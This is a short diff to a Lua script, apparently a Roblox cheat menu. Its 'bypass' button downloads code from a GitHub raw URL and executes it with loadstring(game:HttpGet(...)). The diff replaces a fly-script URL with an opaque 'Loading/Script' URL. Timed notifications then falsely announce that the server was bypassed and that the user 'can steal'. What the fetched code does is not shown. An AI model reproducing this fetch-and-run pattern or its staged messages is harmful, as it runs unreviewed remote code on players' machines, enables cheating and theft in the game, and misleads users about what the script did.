@@ -194,14 +194,14 @@ local bypassResetThread = nil
 bypassBtn.MouseButton1Click:Connect(function()
 	if bypassed then return end
 	bypassed = true
-	showNotification("BYPASS USER......", 3)
+	showNotification("BYPASSING THE SERVER..", 3)
 
 	pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovenew/Loading/refs/heads/main/Script"))()
 	end)
 
 	task.delay(4, function()
-		showNotification("USER HAVE BEEN BYPASSED YOU CAN STEAL NOW", 2)
+		showNotification("USER HAVE BEEN BYPASSED YOU CAN STEAL THE USER", 2)
 	end)
 
 	if bypassResetThread then
